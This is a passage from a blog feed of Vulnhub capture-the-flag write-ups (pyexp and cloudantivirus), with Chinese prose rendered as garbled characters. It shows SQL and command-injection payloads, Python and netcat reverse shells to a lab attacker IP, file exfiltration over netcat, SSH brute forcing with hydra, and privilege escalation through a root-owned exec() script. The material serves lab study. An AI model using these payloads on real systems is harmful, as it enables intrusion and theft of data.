<p>è¿™é‡Œå…¶å®å¡äº†éå¸¸ä¹…ï¼Œåæ¥ç™¾åº¦çŸ¥é“äº†fernetå…¶å®æ˜¯pythonä¸­ç”¨æ¥åŠ è§£å¯†çš„ä¸€ä¸ªåº“ã€‚</p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://cryptography.io/en/latest/fernet/">Fernet (symmetric encryption) â€” Cryptography 38.0.0.dev1 documentation</a></p>
<p>å¯ä»¥å°è¯•å®˜æ–¹ç»™çš„åŠ å¯†ä»£ç ç”Ÿæˆå¯†é’¥å’ŒåŠ å¯†ï¼Œä¼šå‘ç°å¯†é’¥å’ŒåŠ å¯†çš„å­—ç¬¦ä¸²å’Œkeyyå’Œcredéå¸¸ç±»ä¼¼ã€‚å› æ­¤ç¡®å®šæ˜¯åˆ©ç”¨fernetè¿›è¡ŒåŠ å¯†çš„ã€‚</p>
<p>æœ‰ä¸¤ç§è§£å¯†æ–¹æ³•ï¼š</p>
<ol type="1">
<li>åœ¨çº¿ç½‘ç«™ï¼š<a href="https://asecuritysite.com/encryption/ferdecode">Fernet (Decode)</a></li>
<li>ç¼–å†™pythonä»£ç </li>
</ol>
<p>å‰è€…æ¯”è¾ƒç®€å•ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png" /></p>
<p>åè€…æ¼”ç¤ºï¼š(å¦‚æœåˆ©ç”¨å®˜æ–¹çš„è§£å¯†ä»£ç æŸ¥çœ‹è¿‡ç”Ÿæˆçš„keyå’Œtokenï¼Œå°±ä¼šå‘ç°å®ƒä»¬æ˜¯byteå‹çš„ï¼Œæ‰€ä»¥å‰é¢åŠ b)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b<span class="string">&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span></span><br><span class="line">token = b<span class="string">&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span></span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure></p>
<p>æ ¹æ®/etc/passwdçš„å†…å®¹ï¼ŒçŒœæµ‹è¿™æ˜¯sshç™»å½•çš„è´¦å·å’Œå¯†ç ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: lucy</span><br><span class="line">password: wJ9`&quot;Lemdv9[FEw- # è¿™å¯†ç èƒ½çˆ†ç ´å‡ºæ¥å°±æœ‰é¬¼äº†</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png" /></p>
<p>åˆ‡è®°è¦æŒ‡å®šç«¯å£ï¼ï¼ï¼</p>
<h2 id="æƒé™æå‡">2.5. æƒé™æå‡</h2>
<p>åœ¨ä¿¡æ¯æ”¶é›†çš„æ—¶å€™å‘ç°ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png" /></p>
<p>æŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶çš„æƒé™é…ç½® <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucy@pyexp:~$ ls -l /opt/exp.py</span><br><span class="line">-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py</span><br></pre></td></tr></table></figure></p>
<p>è¯»å–æ–‡ä»¶å†…å®¹ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucy@pyexp:~$ cat /opt/exp.py</span><br><span class="line">uinput = raw_input(<span class="string">&#x27;how are you?&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(uinput)</span><br></pre></td></tr></table></figure></p>
<p>å¿ƒé‡Œç‹‚å–œï¼Œexecæ˜¯pythonçš„å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œpythonä»£ç ã€‚å¹¶ä¸”è¯¥æ–‡ä»¶çš„å±ä¸»ä¸ºrootï¼Œå¦‚æœç”¨è¯¥æ–‡ä»¶å¾—åˆ°shellï¼Œé‚£å°±æˆåŠŸææƒåˆ°rootã€‚</p>
<p>è¾“å…¥å¦‚ä¸‹å‘½ä»¤ç›´æ¥ææƒï¼š(æå‰ç”¨whichç¡®å®šä¸€ä¸‹æ˜¯å¦æœ‰bash) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png" /></p>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨ä¹‹å‰pythonåå¼¹shellçš„ä»£ç ï¼š(kaliå…ˆç›‘å¬) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png" /></p>
<p>è¿˜å¯ä»¥è¿™ä¹ˆå†™åå¼¹shellï¼Œæ•ˆæœå’Œä¸Šé¢çš„ä¸€æ ·ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;nc 192.168.137.10 4444 -e /bin/bash&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>è¯»å–ä¸¤ä¸ªflagï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/lucy/user.txt</span><br><span class="line">8ca196f62e91847f07f8043b499bd9be</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">a7a7e80ff4920ff06f049012700c99a8</span><br></pre></td></tr></table></figure></p>
<h1 id="æ€»ç»“">3. æ€»ç»“</h1>
<p>è¯¥é¶æœºéš¾åº¦å¹¶ä¸ç®—é«˜ï¼Œéå¸¸æœ‰ç‰¹ç‚¹ï¼Œä»¥å¾€çš„é¶æœºéƒ½æ˜¯é€šè¿‡webè¿›è¡Œget shellï¼Œè€Œè¿™å°é¶æœºé€šè¿‡æ•°æ®åº“ä¿¡æ¯æ¥get shellã€‚</p>
<p>ä¸»è¦çš„éš¾ç‚¹åœ¨èƒ½å¦çŸ¥é“fernetæ˜¯pythonçš„åŠ è§£å¯†çš„åº“ã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>MySQLå¯†ç çˆ†ç ´</tag>
        <tag>sudoææƒ</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Vulnhub cloudantivirus writeup</title>
    <url>/2022/03/29/2.%20Vulnhub%20cloudantivirus%20writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ç®€å•ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼šhttps://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p>
<p>éš¾åº¦ï¼šEasy</p>
<p>è™šæ‹Ÿæœºè½¯ä»¶ï¼šVirtual Box</p>
<h1 id="ç½‘å¡é…ç½®">ç½‘å¡é…ç½®</h1>
<p>æŸ¥çœ‹ <strong>ç¬¬ä¸€å‘¨</strong> çš„ä¿¡æ¯ã€‚ æ”»å‡»ä¸»æœº kaliï¼š<code>192.168.137.104</code></p>
<h1 id="æ¸—é€">æ¸—é€</h1>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<p>å¯ä»¥ä½¿ç”¨ <code>sudo arp-scan -l</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>arping</code> ã€‚åè€…é€Ÿåº¦æ…¢ï¼Œæ•ˆç‡ä½ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯åè€…æ˜¯ä¸€ä¸ª<strong>ç½‘ç»œå·¥å…·</strong>ï¼Œè€Œå‰è€…æ˜¯ä¸€ä¸ª<strong>é»‘å®¢å·¥å…·</strong>ï¼Œè¿™å°±æ„å‘³ç€å¤§éƒ¨åˆ†Linuxéƒ½ä¼šè£…å‰è€…ï¼Œè€Œåªæœ‰kaliè¿™ç§çš„æ‰ä¼šè£…åè€…ã€‚å› æ­¤ï¼Œåœ¨å†…ç½‘æ¸—é€çš„æ—¶å€™ç›®æ ‡ä¸»æœºå¯èƒ½æ²¡æœ‰å‰è€…ï¼Œè¿™æ—¶å€™å°±èƒ½ä½¿ç”¨åè€…äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254);do sudo arping -c 2 192.168.137.$i;done</span><br></pre></td></tr></table></figure>
<p>ä¸ ping ç±»ä¼¼ï¼Œä¸€æ¬¡åªèƒ½æ‰«æä¸€ä¸ªIPã€‚<code>-c</code> åé¢çš„å‚æ•°æŒ‡çš„æ˜¯æ¯ä¸ªIPçš„å‘åŒ…æ¬¡æ•°ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204936.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204715.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204836.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204826.png" /></p>
<p><code>192.168.137.100</code> æ˜¯ä¸»æœºåœ¨è¿™ä¸ªç½‘æ®µçš„IPï¼›<code>192.168.137.1</code> æ˜¯ç½‘å…³ï¼›<code>192.168.137.104</code> æ˜¯kali IPï¼›é‚£ä¹ˆ<code>192.168.137.103</code> å°±æ˜¯ç›®æ ‡é¶æœºäº†ã€‚</p>
<p>ä»æ‰«æç»“æœä¹Ÿå¯ä»¥çœ‹å‡ºè¿™ä¸ªå·¥å…·å¹¶ä¸ä¼šå°†æœ¬æœºä¸»æœºå½“ä½œå­˜æ´»ä¸»æœºï¼</p>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205256.png" /></p>
<h2 id="ç«¯å£æœåŠ¡å‘ç°">ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205415.png" /></p>
<ol type="1">
<li>22ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯ openssh</li>
<li>é¶æœºç³»ç»Ÿä¸º Ubuntu</li>
<li>8080ç«¯å£çš„æœåŠ¡æ˜¯ httpï¼Œä¿¡æ¯ä¸ç¬¬1å‘¨ä¸€æ ·</li>
<li>é¶æœºä¸Šå­˜åœ¨ç€ python2 ç¯å¢ƒ</li>
</ol>
<h2 id="è®¿é—®-http-æœåŠ¡">è®¿é—® http æœåŠ¡</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211057.png" /></p>
<p>æ¥ä¸‹æ¥ï¼Œå½“ç„¶è¦è¿›è¡Œ<strong>ç›®å½•æ‰«æ</strong>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211439.png" /></p>
<p>æœ‰ä¸€ä¸ª <code>/console</code>ï¼Œæ‰“å¼€å¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211506.png" /></p>
<p>è¿™è¾¹æš‚æ—¶æ²¡æœ‰å¤´ç»ªï¼Œå…ˆæ”¾ç€ï¼Œå»æµ‹è¯•ä¸€ä¸‹ç½‘é¡µçš„åŠŸèƒ½ç‚¹ã€‚</p>
<p>æ¥ä¸‹æ¥è¦ç”¨ burp æŠ“åŒ…ï¼Œæ‰€ä»¥å…ˆè®¾ç½®ä¸€ä¸‹ä»£ç†ï¼Œå°†æµè§ˆå™¨çš„ä»£ç†è®¾ç½®ä¸ºå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211629.png" /></p>
<p>ç«¯å£å…¶å®å¯ä»¥è®¾ç½®ä¸ºå…¶ä»–çš„ï¼Œåªè¦å’Œ burp ä¸­çš„ä¿æŒä¸€è‡´å³å¯ã€‚</p>
<p>å‘ç°éœ€è¦è¾“å…¥éªŒè¯ç ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œ<strong>å…ˆç”¨burp fuzz ä¸€ä¸‹é”®ç›˜ä¸Šçš„ç‰¹æ®Šå­—ç¬¦</strong>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212320.png" /></p>
<p>å‘ç°å½“è¾“å…¥åŒå¼•å·çš„æ—¶å€™å‡ºç°äº†ä¸ä¸€æ ·çš„æç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212405.png" /></p>
<p>ä»è¿™æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p>
<ol type="1">
<li>è·¯å¾„ä¿¡æ¯</li>
<li>æ¨¡æ¿ä¸º flask</li>
<li>å­˜åœ¨ sql æ³¨å…¥è¯­å¥ï¼Œé—­åˆæ–¹å¼ä¸ºåŒå¼•å·</li>
</ol>
<h2 id="sql-æ³¨å…¥">sql æ³¨å…¥</h2>
<p>æ ¹æ® sql æŸ¥è¯¢è¯­å¥æ„é€ å¦‚ä¸‹ payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1-- </span><br><span class="line">æœ€åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼ï¼ï¼</span><br></pre></td></tr></table></figure></p>
<p>æˆåŠŸè¿›å…¥ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212626.png" /></p>
<p>è§‚å¯Ÿè¿™äº›æ–‡ä»¶ï¼Œå‘ç°è¿™è·Ÿåœ¨å‘½ä»¤è¡Œæ‰§è¡Œ <code>ls -l</code> è¿”å›çš„ç»“æœå¾ˆåƒã€‚å¹¶ä¸”è¿™æ˜¯ä¸€ä¸ªäº‘åç—…æ¯’çš„ç¨‹åºï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥æ–‡ä»¶åä¹‹åï¼Œåå°è‚¯å®šæ‰§è¡Œäº†æŸæ¡å‘½ä»¤ï¼Œå‡è®¾ä¸º <code>cloudav filename</code> ã€‚æˆ‘ä»¬çŸ¥é“ Linux ç³»ç»Ÿä¸­å¯ä»¥ä¸€æ¬¡æ€§æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œæ–¹å¼æœ‰å¾ˆå¤šï¼Œå¯ä»¥é€šè¿‡ <code>|</code>, <code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>;</code> ç­‰ç¬¦å·çš„å¸®å¿™åšåˆ°ï¼Œè¿™é‡Œé€‰ç”¨ç®¡é“ç¬¦ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|id</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°ç¡®å®å¯ä»¥æ‰§è¡Œï¼Œå› æ­¤ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è€ƒè™‘å¼¹shelläº†ã€‚</p>
<h2 id="åå¼¹-shell">åå¼¹ shell</h2>
<p>ç¬¬ä¸€å‘¨ä¸­ä½¿ç”¨çš„æ˜¯ python åå¼¹ï¼Œè¿™é‡Œçš„ç¯å¢ƒä¸ç¬¬ä¸€å‘¨ä¸€æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥ç”¨ python çš„ã€‚ä½†æ˜¯ç”±äºç°åœ¨å±äºå­¦ä¹ é˜¶æ®µï¼Œå› æ­¤å°±ä½¿ç”¨ä¸åŒçš„åŠæ³•ï¼Œè¿™é‡Œä½¿ç”¨ <code>nc</code>ã€‚</p>
<p>åœ¨kaliä¸Šå¯åŠ¨ç›‘å¬ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>ç‹çˆ·è¾“å…¥å‘½ä»¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œå‘ç°kaliå¹¶æ²¡æœ‰ã€‚è¿™æ˜¯å› ä¸ºï¼Œ <code>-e</code> è¿™ä¸ªå‚æ•°ä¸æ˜¯æ‰€æœ‰çš„ <code>nc</code> ç‰ˆæœ¬éƒ½æœ‰ï¼Œå¯ä»¥ä½¿ç”¨ <code>which nc</code> æŸ¥çœ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦æœ‰ <code>nc</code> ï¼Œå¦‚æœæœ‰çš„è¯åˆ™è¯´æ˜ï¼Œä¸å­˜åœ¨ <code>-e</code> æ“ä½œã€‚è¿™é‡Œæ‰§è¡Œ <code>hello|which nc</code> å¼¹å‡ºä¿¡æ¯ <code>/bin/nc</code> è¯´æ˜å¯¹æ–¹ä¸»æœºå­˜åœ¨ <code>nc</code> ä½†æ˜¯æ²¡æœ‰å‚æ•° <code>-e</code>ã€‚</p>
<p>æ­¤æ—¶å¯ä»¥ä½¿ç”¨ <strong>ncä¸²è”</strong>ï¼ï¼ï¼æ“ä½œå¦‚ä¸‹ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼Œkali å¼€ä¸¤ä¸ªå‘½ä»¤è¡Œçª—å£åˆ†åˆ«ç›‘å¬ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 3333</span><br><span class="line">2. nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>ç¬¬äºŒæ­¥ï¼Œç½‘é¡µè¾“å…¥å‘½ä»¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 3333|/bin/sh|nc 192.168.137.104 4444</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šä¸€ä¸‹è¿™ä¸ªæ„æ€ï¼š</p>
<blockquote>
<p>é¦–å…ˆå¾—çŸ¥é“ç®¡é“ç¬¦çš„ä½œç”¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œ<code>cmd1|cmd2</code>ï¼Œåœ¨è¿™é‡Œcmd1æ‰§è¡Œå®Œä¹‹åå°†ç»“æœä½œä¸ºå‚æ•°ä¼ å…¥cmd2ï¼ˆè‡³äºcmd2ç”¨ä¸ç”¨å°±æ˜¯å¾—çœ‹cmd2æœ¬èº«éœ€ä¸éœ€ä¼ å‚ï¼‰ã€‚ç°åœ¨æ¥è§£é‡Šä¸€ä¸‹é‚£å¥å‘½ä»¤ï¼Œå‡è®¾kaliè¾“å…¥å‘½ä»¤ <code>ls</code>ï¼Œç„¶åé€šè¿‡3333ç«¯å£åˆ°è¾¾é¶æœºï¼Œé¶æœºé€šè¿‡<code>nc 192.168.137.104 3333</code>æ¥æ”¶åˆ°åå°†å‘½ä»¤é€šè¿‡ç®¡é“ç¬¦ä¼ ç»™ <code>/bin/sh</code>ï¼Œshellæ‰§è¡Œå®Œå‘½ä»¤<code>ls</code>åï¼Œå°†ç»“æœé€šè¿‡<code>nc 192.168.137.104 4444</code>ä¼ å…¥åˆ°kaliï¼Œkaliç›‘å¬4444ç«¯å£ï¼Œå¾—åˆ°<code>ls</code>æ‰§è¡Œçš„ç»“æœã€‚</p>
</blockquote>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329215902.png" /></p>
<p>æŸ¥çœ‹ id å‘ç°æ˜¯ scannerï¼Œä¸æ˜¯ rootã€‚å› æ­¤ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦ææƒã€‚</p>
<h2 id="æƒé™æå‡-æœ¬åœ°ææƒ">æƒé™æå‡-æœ¬åœ°ææƒ</h2>
<p>ç¬¬ä¸€å‘¨ç”¨çš„æ˜¯<strong>å†…æ ¸æ¼æ´ææƒ</strong>ï¼Œæœ¬å‘¨æ¢ä¸€ä¸ªåŠæ³•ã€‚</p>
<p>ç°åœ¨é¶æœºä¸Šè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œçœ‹åˆ°äº† <code>templates</code>ï¼Œæ ¹æ®ä¹‹å‰æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œè¿™åº”è¯¥æ˜¯ <code>flask</code> æ­å»ºçš„æ¨¡æ¿æ–‡ä»¶ã€‚å¯¹æˆ‘ä»¬çš„ææƒæ²¡æœ‰ä½œç”¨ï¼Œæ³¨æ„åˆ°æœ‰ä¸€ä¸ª <code>.sql</code> æ–‡ä»¶ï¼Œè¿™æ˜¯æ•°æ®åº“çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰è´¦å·å’Œå¯†ç è¿™äº›éšç§ã€‚</p>
<p>åˆ©ç”¨ <code>file database.sql</code> å‘ç°æ‰“ä¸å¼€ï¼Œåæ¥å‘ç°æ˜¯å› ä¸ºé¶æœºä¸Šæ²¡æœ‰ <code>sqlite</code>ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯ sqliteï¼Œè¿™æ˜¯å› ä¸º sql æ³¨å…¥çš„æŠ¥é”™ä¿¡æ¯æç¤ºçš„ã€‚é‚£ä¹ˆå°±å°†è¿™ä¸ªæ–‡ä»¶å‘åˆ°kaliä¸Šæ‰“å¼€ã€‚</p>
<p>kaliæ‰“å¼€ç›‘å¬å™¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure></p>
<p>é¶æœºè¾“å…¥ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.104 5555 &lt; dabase.sql</span><br></pre></td></tr></table></figure></p>
<p>ä¸€æ®µæ—¶é—´ï¼ˆä¿è¯æ–‡ä»¶ä¼ è¾“å®Œæ¯•ï¼‰åæ‰‹åŠ¨æ–­å¼€è¿æ¥ï¼Œæ¥ç€æ‰“å¼€è¯¥æ–‡ä»¶ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlite3</span><br><span class="line">2. .open db.sql</span><br><span class="line">3. .database</span><br><span class="line">4. .dump</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329221819.png" /></p>
<p>æ­¤æ—¶è·å¾—äº†å¯†ç ï¼Œæ¥ä¸‹æ¥å¯ä»¥å°è¯•ä¸€ä¸‹è·å–å’Œ shell æœ‰å…³çš„è´¦å·ï¼Œç„¶åä¸è¿™äº›å¯†ç ç»„åˆè¿›è¡Œçˆ†ç ´æ”»å‡»ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªè´¦å·ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222213.png" /></p>
<p>æ¥ä¸‹æ¥å°†ç”¨æˆ·åä¿å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¯†ç ä¸ºå¦ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ <code>hydra</code> çˆ†ç ´ sshã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p passwd.txt ssh://192.168.137.103</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222931.png" /></p>
<p>å‘ç°çˆ†ç ´æ²¡æœ‰æˆåŠŸçš„ã€‚è¿™ä»¶äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œæœ‰æ—¶å€™è‡ªè®¤ä¸ºå¾ˆæœ‰ç”¨çš„å¯†ç ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚é”™è¯¯æ²¡ä»€ä¹ˆå¯æ€•çš„ï¼Œå¯æ€•çš„æ˜¯ä¸æ•¢å°è¯•ï¼</p>
<p>ä¸€ä¸ªå°ç§˜å¯†ï¼Œä¸Šé¢æœé›†çš„å¯†ç å¯ä»¥ç”¨æ¥ç™»å½•ä¹‹å‰ sql æ³¨å…¥çš„åœ°æ–¹ã€‚</p>
<p>æ¥ä¸‹æ¥æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥ææƒï¼Ÿå¯¹äº†ï¼Œ<strong><code>SUID</code> ææƒ</strong>ä¹Ÿæ˜¯Linuxæœ¬åœ°ææƒå¸¸ç”¨çš„ä¸€ç§åŠæ³•ã€‚</p>
<blockquote>
<p>æŸä¸ªç¨‹åºå¦‚æœå…·æœ‰ suid çš„æƒé™ï¼Œé‚£ä¹ˆè¿™å°ä¸»æœºä¸Šçš„ä»»ä½•ç”¨æˆ·æ‰§è¡Œè¯¥ç¨‹åºéƒ½å°†é»˜è®¤ç»§æ‰¿è¯¥ç¨‹åºå±ä¸»çš„æƒé™ã€‚å¦‚æœå±ä¸»æ˜¯rootï¼Œé‚£ä¹ˆè¯¥ç¨‹åºå°±æ˜¯ç”¨rootæƒé™æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥æƒ³åŠæ³•åˆ©ç”¨è¯¥ç¨‹åºå»è·å¾—shellã€‚</p>
</blockquote>
<p>å‘ç°è¯¥ç›®å½•ä¸‹å¹¶æ²¡æœ‰suidæƒé™çš„ç¨‹åºï¼Œå¾€ä¸Šä¸€ä¸ªç›®å½•æŸ¥æ‰¾ï¼Œå‘ç°ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329223319.png" /></p>
<p>æ³¨æ„ä¸­é—´é‚£ä¸ªç¨‹åºæœ€å‰é¢æœ‰ä¸€ä¸ª <code>s</code>ã€‚è¿™å°±æ˜¯ suid æƒé™çš„æ ‡å¿—ï¼ï¼ï¼ç„¶åæ³¨æ„åˆ°ä¸‹é¢è¿˜æœ‰ä¸€ä¸ª.cæ–‡ä»¶ï¼Œè¿™åº”è¯¥å°±æ˜¯æºç äº†ï¼ŒæŸ¥çœ‹æºç ï¼š <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
